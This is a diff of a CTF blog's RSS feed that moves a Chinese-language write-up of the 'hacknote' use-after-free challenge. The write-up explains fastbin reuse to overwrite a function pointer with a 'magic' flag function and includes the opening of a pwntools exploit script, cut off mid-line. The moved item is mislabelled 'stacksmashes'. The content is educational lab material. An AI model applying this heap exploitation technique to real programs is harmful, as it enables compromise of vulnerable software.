@@ -16,38 +16,6 @@
     </item>
     
     <item>
-      <title></title>
-      <link>https://jellyfish-pro.github.io/ctf/use_after_free/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://jellyfish-pro.github.io/ctf/use_after_free/</guid>
-      <description>此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
-首先查看一下保护：
-可以发现这居然是一个32位程序，并且没有开启pie
-随后运行一下程序：
-可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
-随后我们来到ida查看这些功能的细节：
-在查看添加函数时，我们发现存在一个名为v0的结构体：
-通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
-**注意：**这里的content也是通过malloc函数分配的空间。
-随后我们看到删除函数：
-可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
-结合刚刚程序的流程，我们可以得出一条利用方式：
-首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
-**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
-当我们创建两个note后，我们需要将这两个note给删除。
-这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
-但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
-这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
-那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
-最后数据就会变为这样：
-可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
-如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
-同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
-#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &amp;#39;debug&amp;#39;p = process(&amp;#39;./hacknote&amp;#39;)magic = 0x08048986p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;aaaa&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;bbbb&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.</description>
-    </item>
-    
-    <item>
       <title>enumcanary</title>
       <link>https://jellyfish-pro.github.io/ctf/enumcanary/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -558,6 +526,38 @@ void __attribute__ ((noreturn)) __stack_chk_fail (void){__fortify_fail (&amp;#
 而这个漏洞在之后的更新中已经修复，故需要在ubuntu16.04上使用。
 新版libc中__stack_chk_fail函数代码：
 void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (false, &amp;#34;stack smashing detected&amp;#34;);}void__attribute__ ((noreturn))__fortify_fail_abort (_Bool need_backtrace, const char *msg){/* The loop is added only to keep gcc happy.</description>
+    </item>
+    
+    <item>
+      <title>stacksmashes</title>
+      <link>https://jellyfish-pro.github.io/ctf/use_after_free/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/ctf/use_after_free/</guid>
+      <description>此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
+首先查看一下保护：
+可以发现这居然是一个32位程序，并且没有开启pie
+随后运行一下程序：
+可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
+随后我们来到ida查看这些功能的细节：
+在查看添加函数时，我们发现存在一个名为v0的结构体：
+通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
+**注意：**这里的content也是通过malloc函数分配的空间。
+随后我们看到删除函数：
+可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
+结合刚刚程序的流程，我们可以得出一条利用方式：
+首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
+**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
+当我们创建两个note后，我们需要将这两个note给删除。
+这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
+但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
+这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
+那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
+最后数据就会变为这样：
+可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
+如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
+同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
+#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &amp;#39;debug&amp;#39;p = process(&amp;#39;./hacknote&amp;#39;)magic = 0x08048986p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;aaaa&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;bbbb&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.</description>
     </item>
     
   </channel>
